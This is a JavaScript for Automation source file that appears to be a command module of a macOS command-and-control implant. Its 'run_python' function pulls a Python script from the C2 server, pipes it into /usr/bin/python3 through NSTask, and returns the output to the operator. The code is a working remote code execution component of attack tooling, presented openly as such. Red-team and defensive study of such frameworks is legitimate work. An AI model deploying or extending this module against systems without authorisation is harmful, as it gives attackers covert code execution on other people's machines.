exports.run_python = function(task, command, params){
    //Parse JSON to retrieve input
    let pythonscript = "";
    try {
    let config = JSON.parse(params);
        if(config.hasOwnProperty("script")){
            let python_data = C2.upload(task, config['script']);
            if(typeof python_data === "string"){
                return{"user_output":"Failed to get contents of file", "completed": true, "status": "error"};
            }
            pythonscript = $.NSString.alloc.initWithDataEncoding(python_data, $.NSUTF8StringEncoding);
        }
        else{
            return {"user_output":"Need to supply a valid file to download", "completed": true, "status": "error"};
        }
        let pythonData = pythonscript.dataUsingEncoding($.NSUTF8StringEncoding);
            // Prepare NSTask
            let pythontask = $.NSTask.alloc.init;
            pythontask.setLaunchPath("/usr/bin/python3");
            
            // Set up input and output pipes
            const inputPipe = $.NSPipe.pipe;
            const outputPipe = $.NSPipe.pipe;
            const errorPipe = $.NSPipe.pipe;
            
            pythontask.setStandardInput(inputPipe);
            pythontask.setStandardOutput(outputPipe);
            pythontask.setStandardError(errorPipe);
            
            // Write input to the process
            const inputHandle = inputPipe.fileHandleForWriting;
            inputHandle.writeData(pythonData);
            inputHandle.closeFile;
            
            // Launch task
            pythontask.launch;  
            pythontask.waitUntilExit;
            
            // Read output
            const outputHandle = outputPipe.fileHandleForReading;
            const errorHandle = errorPipe.fileHandleForReading;
            const outputData = outputHandle.readDataToEndOfFile;
            const errorData = errorHandle.readDataToEndOfFile; 
            const outputString = $.NSString.alloc.initWithDataEncoding(outputData, $.NSUTF8StringEncoding);
            const errorString = $.NSString.alloc.initWithDataEncoding(errorData, $.NSUTF8StringEncoding);
            // Aggregate Response
            let response1py = ObjC.unwrap(outputString);
            let response2py = ObjC.unwrap(errorString);
            let responsepy = response1py + response2py;
            return {"user_output":responsepy, "completed": true};
     }catch(error){
        return {"user_output":error.toString(), "completed": true, "status": "error"};
    }
}
